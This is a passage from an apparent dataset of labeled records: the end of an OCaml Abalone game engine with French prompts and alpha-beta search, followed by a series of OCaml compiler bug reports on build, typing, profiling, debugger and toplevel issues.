= ref 0 in\n  print_string \"A vous de jouer.\";\n  while !gg do\n    print_string \"Coup en ligne (l) ou coup en fleche (f) ? \";\n    if (read_line () = \"f\") then\n      begin\n\tprint_string \"Coordonnees de la bille poussee ? \";\n\tp1 := read_int ();\n\tprint_string \"Coordonnees de la position d'arrivee ? \";\n\tp2 := read_int ();\n      end\n    else ();\n    print_string \"Coordonnees de la bille poussee ? \";\n    p3 := read_int ();\n    print_string \"Coordonnees de la position d'arrivee ? \";\n    p4 := read_int ();\n    print_newline ();\n    print_int (!p1*1000000 + !p2*10000 + !p3*100 + !p4);\n    print_newline ();\n    print_string \"Ce coup est-il correct (y/n) ? \";\n    if (read_line () = \"y\") then (gg :=false)\n    else ()\n  done;\n  (!p1*1000000 + !p2*10000 + !p3*100 + !p4);;\n\n(* coups en avant *)\nlet coup_avant code =\n  let v = code / 10000\n  and x = code / 1000 - 10 * (code / 10000)\n  and y = code / 100 - 10 * (code / 1000)\n  and (dx,dy) = dir_tab.(code / 10 - 10 * (code / 100))\n  and l = code - 10 * (code /10) in\n  if v<2 then (* coup en ligne *)\n    begin\n      if v=1 then\n\tif tabl.(x).(y)=1\n\tthen incr out_m\n\telse incr out_p\n      else ();\n      for i=(v+1) to l do\n\ttabl.(x + (l+1-i)*dx).(y + (l+1-i)*dy) <- tabl.(x + (l-i)*dx).(y + (l-i)*dy)\n      done;\n      tabl.(x).(y) <- 0\n    end\n  else (* coup en fleche *)\n    begin\n      let (vx,vy) = dir_tab.(v) in\n      for i=0 to l-1 do\n\ttabl.(x + i*dx + vx).(y + i*dy + vy) <- tabl.(x + i*dx).(y + i*dy);\n\ttabl.(x + i*dx).(y + i*dy) <- 0\n      done;\n    end;;\n\n(* coups en arriere *)\nlet coup_arriere code =\n  let v = code / 10000\n  and x = code / 1000 - 10 * (code / 10000)\n  and y = code / 100 - 10 * (code / 1000)\n  and (dx,dy) = dir_tab.(code / 10 - 10 * (code / 100))\n  and l = code - 10 * (code /10) in\n  if v<2 then (* coup en ligne *)\n    begin\n      for i=0 to l-1-v do\n\ttabl.(x + i*dx).(y + i*dy) <- tabl.(x + (i+1)*dx).(y + (i+1)*dy)\n      done;\n      if v=0 then\n\ttabl.(x + l*dx).(y + l*dy) <- 0\n      else\n\tbegin\n\t  tabl.(x + (l-1)*dx).(y + (l-1)*dy) <- (-tabl.(x).(y));\n\t  if tabl.(x).(y)=1\n\t  then decr out_m\n\t  else decr out_p\n\tend\n    end\n  else (* coup en fleche *)\n    begin\n      let (vx,vy) = dir_tab.(v) in\n      for i=0 to l-1 do\n\ttabl.(x + i*dx).(y + i*dy) <- tabl.(x + i*dx + vx).(y + i*dy + vy);\n\ttabl.(x + i*dx + vx).(y + i*dy + vy) <- 0\n      done;\n    end;;\n\n(* generateur de coups *)\nlet gen cp =\n  let list = ref []\n  and cont = ref true\n  and x = ref 0\n  and y = ref 0\n  and bb = ref 0\n  and mb = ref 0 in\n  for i=1 to 9 do\n    for j=max 1 (i-4) to min 9 (i+4) do\n      if tabl.(i).(j)=cp then\n\tbegin\n\t  for d=1 to 6 do\n\t    let (dx,dy) = dir_tab.(d) in\n\t    cont := true;\n\t    x := i;\n\t    y := j;\n\t    bb := 1;\n\t    mb := 0;\n\t    while !cont do\n\t      x := !x + dx;\n\t      y := !y + dy;\n\t      match tabl.(!x).(!y)*cp with\n\t      |\t1 ->\n\t\t  incr bb;\n\t\t  if (!bb > 3 or !mb > 0)\n\t\t  then cont := false\n\t\t  else \n\t\t    begin (* coups en fleche *)\n\t\t      let (vx1,vy1) = dir_tab.(d+1) in\n\t\t      let (vx2,vy2) = dir_tab.(d+2) in\n\t\t      if (tabl.(i+vx1).(j+vy1)=0 && tabl.(i+dx+vx1).(j+dy+vy1)=0 && tabl.(!x+vx1).(!y+vy1)=0)\n\t\t      then (list := (((d+1)*10000 + i*1000 + j*100 + d*10 + !bb) :: !list))\n\t\t      else ();\n\t\t      if (tabl.(i+vx2).(j+vy2)=0 && tabl.(i+dx+vx2).(j+dy+vy2)=0 && tabl.(!x+vx2).(!y+vy2)=0)\n\t\t      then (list := (((d+2)*10000 + i*1000 + j*100 + d*10 + !bb) :: !list))\n\t\t      else ()\n\t\t    end\n\t      |\t-1 ->\n\t\t  incr mb;\n\t\t  if (!mb = !bb)\n\t\t  then cont := false\n\t\t  else ()\n\t      |\t0 ->         (* coups en ligne sans ejection *)\n\t\t  list := ((i*1000 + j*100 + d*10 + !bb + !mb) :: !list);\n\t\t  cont := false\n\t      |\t_ ->\n\t\t  if (!mb>0) (* coups en ligne avec ejection *)\n\t\t  then list := ((10000 + i*1000 + j*100 + d*10 + !bb + !mb) :: !list)\n\t\t  else ();\n\t\t  cont := false\n\t    done\n\t  done\n\tend\n    done\n  done;\n  !list;;\n\n(**************)\n(* EVALUATION *)\n(**************)\n\n(* distance *)\nlet dist_int i j k l =\n  let dx = (abs (k-i))\n  and dy = (abs (l-j))\n  and dz = (abs (k-i-l+j)) in\n  dx + dy + dz - (max (max dx dy) dz);;\n\nlet dist_float i j k l =\n  let dx = (abs_float (k-.i))\n  and dy = (abs_float (l-.j))\n  and dz = (abs_float (k-.i-.l+.j)) in\n  dx +. dy +. dz -. (max (max dx dy) dz);;\n\n(* evaluation de l'environnement d'une bille *)\nlet env i j = \n  let a = ref 0\n  and b = ref 0 in\n  for k=0 to 5 do\n    begin\n      a := (tabl.(i + dir_x.(k)).(j + dir_y.(k)) * tabl.(i).(j) + 4) mod 4;\n      b := !b + !a * (puissance 4 k);\n    end\n  done;\n  eval.(!b);;\n\n(* fonction d'evaluation *)\nlet evaluate () =\n  let sigx_p = ref 0\n  and sigy_p = ref 0\n  and sigx_m = ref 0\n  and sigy_m = ref 0\n  and env_p = ref 0\n  and env_m = ref 0 in\n  for i=1 to 9 do\n    for j=max 1 (i-4) to min 9 (i+4) do\n      match tabl.(i).(j) with\n      |\t0 -> ()\n      |\t1 ->\n\t  begin\n\t    sigx_p := !sigx_p + i;\n\t    sigy_p := !sigy_p + j;\n\t    env_p := !env_p + env i j\n\t  end\n      |\t-1 ->\n\t  begin\n\t    sigx_m := !sigx_m + i;\n\t    sigy_m := !sigy_m + j;\n\t    env_m := !env_m + env i j\n\t  end\n      |\t_ -> ()\n    done\n  done;\n  let barx_p = (float !sigx_p) /. (float (14 - !out_p))\n  and bary_p = (float !sigy_p) /. (float (14 - !out_p))\n  and barx_m = (float !sigx_m) /. (float (14 - !out_m))\n  and bary_m = (float !sigy_m) /. (float (14 - !out_m)) in\n  let centr_p = dist_float 5. 5. barx_p bary_p\n  and centr_m = dist_float 5. 5. barx_m bary_m in\n  \n  if print then\n    begin\n      print_string \"1/centrage + : \";\n      print_float (1. /. centr_p);\n      print_newline ();\n      print_string \"difference de centrage : \";\n      print_float (p2 *. (1. /. centr_p -. 1. /. centr_m));\n      print_newline ();\n      print_string \"difference d'environnement : \";\n      print_int (p3 * (!env_p - !env_m));\n      print_newline ();\n    end\n  else ();\n\n  (p1 * (!out_m - !out_p) + int_of_float(p2 *. (centr_m -. centr_p)) + p3 * (!env_p - !env_m));;\n\n\n(**************)\n(* ALPHA-BETA *)\n(**************)\n\nlet comp coup_1 coup_2 =\n  coup_avant coup_1;\n  let e1 = evaluate () in\n  coup_arriere coup_1;\n  coup_avant coup_2;\n  let e2 = evaluate () in\n  coup_arriere coup_2;\n  e1-e2;;\n\nlet rec ab p alpha beta cp =\n  let a = ref alpha\n  and b = ref beta in\n  let l = ref (gen cp) in\n  if (p=1) then\n    begin\n      if (cp>0) then\n\tbegin\n\t  while ((!a)<(!b) && (!l<>[])) do\n\t    coup_avant (List.hd !l);\n\t    a := max !a (evaluate ());\n\t    coup_arriere (List.hd !l);\n\t    l := List.tl !l\n\t  done;\n\t  !a\n\tend\n      else\n\tbegin\n\t  while ((!a)<(!b) && (!l<>[])) do\n\t    coup_avant (List.hd !l);\n\t    b := min !b (evaluate ());\n\t    coup_arriere (List.hd !l);\n\t    l := List.tl !l\n\t  done;\n\t  !b\n\tend\n    end\n  else\n    begin\n      if (cp>0) then\n\tbegin\n\t  while ((!a)<(!b) && (!l<>[])) do\n\t    coup_avant (List.hd !l);\n\t    a := max !a (ab (p-1) !a !b (-cp));\n\t    coup_arriere (List.hd !l);\n\t    l := List.tl !l\n\t  done;\n\t  !a\n\tend\n      else\n\tbegin\n\t  while ((!a)<(!b) && (!l<>[])) do\n\t    coup_avant (List.hd !l);\n\t    b := min !b (ab (p-1) !a !b (-cp));\n\t    coup_arriere (List.hd !l);\n\t    l := List.tl !l\n\t  done;\n\t  !b\n\tend\n    end;; \n\nlet ab1 p0 cp =\n  let a = ref (-inf)\n  and b = ref (inf)\n  and c = ref 0 \n  and e = ref 0 in\n  let l = ref (List.sort comp (gen cp)) in\n  if (cp>0) then\n    begin\n      l := List.rev !l; (* classer par evaluation decroissante pour cp=1 *)\n      while (!l<>[]) do\n\tcoup_avant (List.hd !l);\n\te := ab (p0-1) !a !b (-cp);\n\tcoup_arriere (List.hd !l);\n\tif ((!e)>(!a)) then\n\t  begin\n\t    c := List.hd !l;\n\t    a := !e\n\t  end\n\telse ();\n\tl := List.tl !l\n      done\n    end\n  else\n    begin\n      while (!l<>[]) do\n\tcoup_avant (List.hd !l);\n\te := ab (p0-1) !a !b (-cp);\n\tcoup_arriere (List.hd !l);\n\tif ((!e)<(!b)) then\n\t  begin\n\t    c := List.hd !l;\n\t    b := !e\n\t  end\n\telse ();\n\tl := List.tl !l\n      done\n    end;\n  !c;;\n\n(**************************)\n(* GESTIONNAIRE DE PARTIE *)\n(**************************)\n\n(* jouer un coup et afficher *)\nlet playshow code =\n  coup_avant code;\n  print_matrix ();\n  print_int (evaluate ());\n  print_newline ();;\n\n(* jouer avec le serveur *)\n\n(* jouer contre moi-meme *)\nlet solo () =\n  let cp = ref 1 in\n  print_string \"Partie de demonstration.\";\n  print_newline ();\n  print_matrix ();\n  while ((!out_p <6) && (!out_m <6)) do\n    playshow (ab1 !prof !cp);\n    cp := (- !cp)\n  done;;\n\n(* jouer contre humain *)\nlet humain () =\n  let cp = ref 0 in\n  print_string \"Voulez-vous commencer ? (y/n) \";\n  if (read_line () = \"y\") then\n    begin\n      cp := -1;\n      print_newline ();\n      print_string \"Vous avez les noirs. Vous commencez.\";\n      print_newline ();\n      print_matrix ();\n      playshow (cnp (coup_humain ()))\n    end\n  else\n    begin\n      cp := 1;\n      print_newline ();\n      print_string \"Vous avez les blancs. Les noirs commencent.\";\n      print_newline ();\n      print_matrix ()\n    end;\n  while ((!out_p <6) && (!out_m <6)) do\n    playshow (ab1 !prof !cp);\n    playshow (cnp (coup_humain ()))\n  done;\n  if ((!out_p = 6 && !cp = 1) || (!out_m = 6 && !cp = -1)) then\n    print_string \"Bien joue !\"\n  else\n    print_string \"Ce traitement est inhumain, n'est-ce pas ?\";\n  print_newline ();;\n\n(* main *)\nlet main =\n  print_string \"Bienvenue sur Abalone\";\n  print_newline();\n  init ();\n  prof := 4;\n  solo ();;\n\n\n\n\n\n\n\n\n\n\n\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 1473\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: chris quinn\nVersion: 3.06\nOS: \nSubmission from: 212.42.169.63 (212.42.169.63)\n\n\nit seems custom finalisation only happens during\na sweep of the major heap.\nif this is so then surely alloc_custom must not\nallocate from the minor heap?\n\ni have observed custom blocks in the minor heap not\nbeing finalised when they go 'out of scope' before\nthe next minor collection.\n\n- chris\n"},{"labels":["bug"],"text":"**Original bug ID:** 1469\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Mikhail Fedotov\nVersion: 3.06\nOS: WinXP\nSubmission from: mera23.adsl.kis.ru (195.98.54.162)\n\n\nCompile on recent MinGW/MSYS fails due to presence of -fnative-struct flag in\ncorresponding Makefile.\n\nI'd better do some cut & paste from \nhttp://bugzilla.gnome.org/long_list.cgi?buglist=91033:\n\n\"The -fnative-struct enables MSVC-style bit field packing on win32 \nplatforms and is required when compiling applications that use the \nwin32 native port of gtk+.\"\n\n\"one day or another, \nwe'll have to consider the case of gcc-3.x where the -fnative-struct \nflag has been renamed to -mms-bitfields.\"\n\nps. Sorry if that's already solved, I've got a feeling of being lost while\nbrowring bug lists. :)\n\nMikhail\n"},{"labels":["bug"],"text":"**Original bug ID:** 1468\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Aleksey Nogin\nVersion: 3.06\nOS: Red Hat Linux 8.0\nSubmission from: dhcp-44-217.cs.caltech.edu (131.215.44.217)\n\n\nIf I do a \"make opt.opt\" and then \"make install\" in ocaml-3.06/camlp4, then it\nturns out that many .cmxa libraries are forgotten by the \"make install\".\n\nI am currently preparing a patch to take care of it, I will put it at\nhttp://nogin.org/patches/camlp4-3.06-opt.patch shortly (in case you are\ninterested, the corresponding patch for 3.04 is also there -\nhttp://nogin.org/patches/camlp4-3.04-opt.patch)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1467\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nAu dÃ©but du chapitre 9 de la documentation d'Ocaml version 3.06\n(The toplevel system (ocaml)), on peut lire : \n\nThe toplevel system does not perform line editing, but it can\neasily be used in conjunction with an external line editor such as\nfep; just run fep -emacs ocaml or fep -vi ocaml.\n\nAprÃ¨s quelques recherches, il s'avÃ¨re que fep n'a pas de site web. Un lien\nqui a Ã©tÃ© publiÃ© sur la mailing-list Caml indique que ce programme est\ndisponible sur le serveur ftp de l'Inria (merci Google!).\nCependant, une fois le produit trouvÃ©, Ã´ surprise, il date de 1987, et ne se\ncompile pas sous Linux !\nPeut-Ãªtre pourriez-vous actualiser la doc en mentionnant ledit Ã  l place de\nfep ?\nCordialement,\nSÃ©bastien Hinderer.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1466\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: John Hale\nVersion: 3.06 + ocaml-3.06-macosx-3.patch\nOS: Mac OS X 10.2.1 6D52\nSubmission from: goedel.cog.jhu.edu (128.220.29.8)\n\n\nbug report\n\nNovember 1st 2002\nJohn Hale\n<hale@cogsci.jhu.edu>\nfile located at:\n  http://www.cog.jhu.edu/grad-students/hale/hale-bug-report.tar.gz\n\nThe bug is a bus error that stops the native version of the program.\nThe byte code version works fine.\n\nThis program is a natural language parser which is relatively expensive to run.\nIt works by constructing a \"chart\" of records about possible constituents that\nmight explain the string its presented with.\n\n\nSince this process is so expensive, I want to print out at periodic intervals\nan\nindication of how large the chart is (there is also another data structure\ncalled\nthe agenda whose size is interesting). Rather than constantly calling Unix time\nfunctions to see if it's time to determine and print out the sizes of these\nstructures,\nI'd like to use signals so that the operating system can notify the program to\ndo so\nat user-specifiable intervals.\n\nThe idea is that, at initialization time, a signal handler will be set up\n\nrunme.ml:607\n  let measured_lately = ref true in\n  Sys.set_signal Sys.sigalrm (Sys.Signal_handle\n\t\t\t    (function x -> if x<>Sys.sigalrm then ()\n\t\t\t      else measured_lately := false ));\n  ignore (Unix.setitimer Unix.ITIMER_REAL\n{Unix.it_interval=measurechartsizeinterval;\n\t\t\t\t\t      Unix.it_value=measurechartsizeinterval});\n\nwhose only function is to change the value of a ref cell called\n\"measured_lately\".\nThen, in the main loop of the program this value will be constantly tested.\n\nchart.ml:200\n\t   if (!t) then () else\n\t     (print_stat st chart q; (* if it's false the alarm has gone off *)\n\t      flush stdout;\n\t      t := true);\n\t   exhaust t st chart q inf\n\nthis is in the recursive function \"exhaust\" (meaning \"exhaustively apply the\ngrammar\nrules to the entries already in the chart) in the module Chart. The test is\nmade\njust before the function tail-recurs.\n\n\nTo replicate the bug, unpack the archive and issue\n\n  % make runme\n\non the command line. This should build the native code version that bombs with a\nbus error\non my system. To exercise the (working) bytecode version, uncomment the #load\nlines at the\ntop of runme.ml, and comment the final line that calls \"parse\". Then runme.ml\ncan be\n #use'd in the toplevel and you can issue the parse command manually. this works\nfine for me\nin that status messages about the size of the chart and agenda are printed out\nat 5 second\nintervals. This interval is set in the \"measurechartsizeinterval\" variable on\nline 582 in runme.ml.\n\n\n\nMy system is\n\tObjective Caml version 3.06 including the patch from\n\t\thttp://caml.inria.fr/caml-macosx-howto/index.html\n\tMac OS X 10.2.1 build 6D52\n\tPowerBook G4\n\nI'm eager to hear of any news about this issue, whether it's a problem with my\ncode or something\nto complain about to Apple -- whatever -- please keep me posted. I am a huge\nO'Caml fan and\nwant to use signals :)\n\n\nbest,\n-john\n"},{"labels":["bug"],"text":"**Original bug ID:** 1465\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nPour contourner l'impossibilitÃ© d'utiliser l'option -pp avec\nocamlcp, j'ai voulu mettre dans le Makefile:\n\n.ml.cmo:\n        camlp4o pa_extend.cmo pr_o.cmo $< -o $<pp\n        ocamlcp -c $(INCLUDES) -impl $<pp\n\net j'ai constatÃ© avec une grande tristesse que ocamlprof refuse de marcher\nlorsque l'extension n'est pas .ml; argh. Est-ce qu'il y a une\nraison Ã  cela ?\n\n\n-- Alain\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7940\n**Reporter:** dansynek\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2019-03-10T09:16:04Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Platform:** Ubuntu\n**OS:** Linux\n**Version:** 4.05.0\n**Category:** standard library\n**Monitored by:** @nojb\n\n## Bug description\n\nIn the documentation it states that by issuing a newline or flush stdout the output buffer is emptied. However, printf uses an internal pretty printing buffer which is not emptied then. One first has to do a printf \"@?\". This hsould either be documented clearly or preferably flushing stdout should also flush the pretty printing buffer.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7939\r\n**Reporter:** @db4\r\n**Status:** feedback (set by @xavierleroy on 2019-03-09T15:15:21Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.07.1\r\n**Category:** lexing and parsing\r\n**Monitored by:** @nojb @diml\r\n\r\n## Bug description\r\n\r\nIf Location.mknoloc is used in a ppx extension, AST gets a node with \"dummy\" begin and end locations:\r\n\r\n```ocaml\r\nlet dummy_pos = {\r\n  pos_fname = \"\";\r\n  pos_lnum = 0;\r\n  pos_bol = 0;\r\n  pos_cnum = -1;\r\n}\r\n```\r\n\r\nUnfortunately this breaks ocamldebug that expects locations been monotonically increasing and uses binary search to set a breakpoint (debugger/symbols.ml):\r\n\r\n```ocaml\r\n(* Binary search of event at or just after char *)\r\nlet find_event ev char =\r\n  let rec bsearch lo hi =\r\n    if lo >= hi then begin\r\n      if (Events.get_pos ev.(hi)).Lexing.pos_cnum < char\r\n      then raise Not_found\r\n      else hi\r\n    end else begin\r\n      let pivot = (lo + hi) / 2 in\r\n      let e = ev.(pivot) in\r\n      if char <= (Events.get_pos e).Lexing.pos_cnum\r\n      then bsearch lo pivot\r\n      else bsearch (pivot + 1) hi\r\n    end\r\n  in\r\n  if Array.length ev = 0 then\r\n    raise Not_found\r\n  else\r\n    bsearch 0 (Array.length ev - 1)\r\n```\r\n\r\nHow to fix that? Completely avoid using Location.mknoloc (but many existing ppx extensions AFAIK use it) or do linear search in ocamldebug instead of binary one?\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7938\r\n**Reporter:** @Reperator\r\n**Status:** acknowledged (set by @xavierleroy on 2019-03-09T09:32:23Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.08.0+dev/beta1/beta2\r\n**Category:** configure and build/install\r\n**Monitored by:** @Reperator @nojb @shindere @stedolan @hcarty\r\n\r\n## Bug description\r\n\r\nautoconf's AC_CHECK_ALIGNOF([long]) always returns \"x8\", regardless of architecture. This is not actually the legal alignment of memory accesses.\r\n\r\nARCH_ALIGN_INT64 used to be defined from the result of config/auto-aux/int64align.c, which actually checks for legal memory access requirements. This was changed in 4.08.\r\n\r\nReading int64 values from the heap is going to be slower.\r\n\r\nhttps://www.gnu.org/software/autoconf/manual/autoconf-2.67/html_node/Generic-Compiler-Characteristics.html\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7937\n**Reporter:** georges.duperon\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2019-03-07T11:09:56Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** crash\n**Platform:** Linux\n**OS:** Debian\n**OS Version:** Debian 9\n**Version:** 4.07.0\n**Fixed in version:** 4.09.0+dev\n**Category:** typing\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nFatal error: exception Ctype.Unify(_)\r\n\r\nTriggered by this minimized version (credits go to Paul Laforgue):\r\n\r\ntype 'a fb = 'a constraint 'a = [< `K of int & 'a];;\r\nlet g : 'a. 'a fb -> bool = fun v -> v = true;;\r\n\r\nMore verbose version:\r\n\r\ntype ('a, 'select) fb = 'a constraint 'select = [< `L of int & 'a | `R of bool & 'a ];;\r\nlet g : 'a 'select . ('a, 'select) fb -> bool = fun v -> v = true;;\n\n## Steps to reproduce\n\n$ cat oops.ml\r\ntype 'a fb = 'a constraint 'a = [< `K of int & 'a];;\r\nlet g : 'a. 'a fb -> bool = fun v -> v = true;;\r\n$ ocamlc -i oops.ml\r\nFatal error: exception Ctype.Unify(_)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7936\n**Reporter:** @dbuenzli\n**Assigned to:** @gasche\n**Status:** resolved (set by @Octachron on 2019-03-04T16:33:46Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.07.1\n**Category:** documentation\n**Monitored by:** @nojb\n\n## Bug description\n\nSee this page:\r\n\r\nhttps://caml.inria.fr/pub/docs/manual-ocaml/objectexamples.html\r\n\r\n(I verified, this seem to still be the case in the docset distributed for the beta 4.08)\n"},{"labels":["bug"],"text":"**Original bug ID:** 1464\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Xavier Leroy\nVersion: 3.06\nOS: \nSubmission from: estephe.inria.fr (128.93.11.95)\nSubmitted by: xleroy\n\n\n(Problem reported by Francois Pessaux.)\n\n$ cat papy.ml\nclass foo =\n  object (self) \n  method badbadbad : int = 5\n  end    \n\n$ ocamlcp -p a papy.ml\nFile \"/tmp/camlpp479ee2\", line 3, characters 2-3:\nSyntax error\n\n$ cat /tmp/camlpp479ee2 \nlet __ocaml_prof_cnt_papy_ = Array.create 0000001 0;; Profiling.counters :=\n(\"papy\", (\"a\", __ocaml_prof_cnt_papy_)) :: !Profiling.counters;; \nclass foo =\n  object (self) \n  (__ocaml_prof_cnt_papy_.(0) <- Pervasives.succ __ocaml_prof_cnt_papy_.(0);\nmet\nhod badbadbad : int = 5)\n  end    \n\nThe profiling code is inserted at the wrong place.  Same bug in 3.04, except\nthat the code is inserted at another equally wrong place :-)\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7933\n**Reporter:** @rauanmayemir\n**Status:** confirmed (set by @nojb on 2019-02-27T19:34:51Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** minor\n**Platform:** Darwin\n**OS:** macOS\n**OS Version:** 10.14.2\n**Version:** 4.07.1\n**Category:** compiler driver\n**Monitored by:** @nojb @gasche\n\n## Bug description\n\nThis could happen whenever you compile with '-complete-output-obj' and have lwt in your deps, ultimately using threads.\n\n## Steps to reproduce\n\nI thought this could only happen with some built-in libs, but I have a suspicion that having any relevant `.dylib` in the -Lpath will trigger this warning.\r\n\r\nE.g: https://github.com/briskml/zarith/blob/d472f6c0588666177c54823298b17f8d5ecc2648/esy.json#L9\r\n\r\nHere I'm feeding Zarith LDFLAGS with gmp -Lpath from a non-standard path. Having done that, I'll get the following warning as well:\r\n\r\n```\r\nld: warning: gmp_path/lib/libgmp.dylib, ignoring unexpected dylib file\r\n```\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7929\n**Reporter:** @trefis\n**Assigned to:** @trefis\n**Status:** assigned (set by @trefis on 2019-02-21T11:15:08Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.08.0+dev/beta1/beta2\n**Category:** typing\n**Monitored by:** @nojb\n\n## Bug description\n\nNoticed when trying odoc on 4.08: https://github.com/ocaml/odoc/issues/311\r\n\r\nThe regression is due to: https://github.com/ocaml/ocaml/commit/4d4fd525c987aa80244d225b2fba09e8dd47f917#diff-668ada709c086c9f2b56861bb1872a5dR461\r\n\r\nIt made the assumption that the order in which we apply the substitution doesn't matter.\r\nWhich is wrong in that case because of: https://github.com/ocaml/ocaml/blob/trunk/typing/subst.ml#L345\r\n\r\nThe obvious fix is to replace the call to List.rev_map by List.rev followed by List.map.\r\n\r\nAnother potential option would be to introduce functions like class_declaration' (and others) which don't do the cleanup.\r\nUse those in signature_item, and call cleanup_types only once at the end.\r\n\r\nI'm going to experiment with that (unless someone jumps in to explain why it can't possibly be correct) and if it works I'll submit that as a fix instead of the obvious one.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7928\n**Reporter:** @stedolan\n**Assigned to:** @lpw25\n**Status:** resolved (set by @gasche on 2019-02-20T21:22:25Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.08.0+dev/beta1/beta2\n**Category:** middle end (typedtree to clambda)\n**Duplicate of:** #7920\n**Monitored by:** @nojb\n\n## Bug description\n\nThe following program (shortened from lm_parser.ml in omake) causes ocamlopt to fail with an index out of bounds error:\r\n\r\n    module type A = sig type t end\r\n    module type Int = A with type t = int\r\n    module I : Int = struct type t = int end\r\n    module A : sig module X : Int end = struct module X = I end\r\n\r\nThe failure occurs on both 4.08 and trunk, but only with ocamlopt and not ocamlc. The backtrace is:\r\n\r\nFatal error: exception Invalid_argument(\"index out of bounds\")\r\nRaised by primitive operation at file \"bytecomp/translmod.ml\", line 895, characters 46-55\r\nCalled from file \"list.ml\", line 92, characters 20-23\r\nCalled from file \"bytecomp/translmod.ml\", line 991, characters 36-54\r\nCalled from file \"bytecomp/translmod.ml\", line 1012, characters 27-112\r\nCalled from file \"bytecomp/translmod.ml\", line 1190, characters 4-69\r\nCalled from file \"bytecomp/translobj.ml\", line 131, characters 13-18\r\nCalled from file \"bytecomp/translmod.ml\", line 1264, characters 18-65\r\nCalled from file \"utils/misc.ml\", line 31, characters 8-15\r\nRe-raised at file \"utils/misc.ml\", line 45, characters 40-48\r\nCalled from file \"driver/optcompile.ml\", line 66, characters 2-94\r\nCalled from file \"driver/optcompile.ml\", line 66, characters 2-162\r\nCalled from file \"utils/misc.ml\", line 31, characters 8-15\r\nRe-raised at file \"utils/misc.ml\", line 45, characters 40-48\r\nCalled from file \"driver/compile_common.ml\", line 124, characters 6-68\r\nCalled from file \"utils/misc.ml\", line 31, characters 8-15\r\nRe-raised at file \"utils/misc.ml\", line 45, characters 40-48\r\nCalled from file \"utils/misc.ml\", line 31, characters 8-15\r\nRe-raised at file \"utils/misc.ml\", line 45, characters 40-48\r\nCalled from file \"driver/compenv.ml\", line 597, characters 6-59\r\nCalled from file \"list.ml\", line 110, characters 12-15\r\nCalled from file \"driver/compenv.ml\", line 673, characters 2-61\r\nCalled from file \"driver/optmain.ml\", line 267, characters 6-163\r\nRe-raised at file \"parsing/location.ml\", line 904, characters 22-25\r\nCalled from file \"driver/optmain.ml\", line 333, characters 6-37\r\nCalled from file \"driver/optmain.ml\", line 337, characters 2-9\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7925\n**Reporter:** @Armael\n**Status:** confirmed (set by @gasche on 2019-02-20T15:37:04Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.09.0+dev\n**Category:** toplevel\n**Tags:** junior_job\n**Monitored by:** @nojb\n\n## Bug description\n\nWhen reporting an error, the toplevel (and since 4.08 also the compiler) highlights the line(s) of the source corresponding to the error:\r\n\r\n```\r\n# let x = 1 + \"abc\" in ();;\r\nLine 1, characters 12-17:\r\n1 | let x = 1 + \"abc\" in ();;\r\n                ^^^^^\r\nError: This expression has type string but an expression was expected of type\r\n         int\r\n```\r\n\r\nHowever, in the toplevel, if the toplevel phrase is long enough (and the error is near the beginning), the code highlight feature stops working:\r\n\r\n```\r\n# let x = 1 + \"abc\" in\r\nlet x = 1 in\r\n[...] (same x75 times)\r\nlet x = 1 in ();;\r\nLine 1, characters 12-17:\r\nError: This expression has type string but an expression was expected of type\r\n         int\r\n```\r\n\r\nI have seen this issue in a teaching situation (in combination with other issues that have now been fixed in 4.08/trunk), \r\nhere students were using emacs+tuareg and using M-x tuareg-eval-buffer to evaluate their 1000-lines long code.\r\n\r\n\r\nHow to fix\r\n----------\r\n\r\nThe \"code highlight\" feature for the toplevel is implemented by directly peeking into the lexer's buffer. This stops working if the lexbuf has been refilled in the meantime, which happens if the input is long enough.\r\nA fix would probably to instead have the toplevel store the complete current toplevel phrase in a Buffer.t, and have the error reporting function read into that instead of the lexing 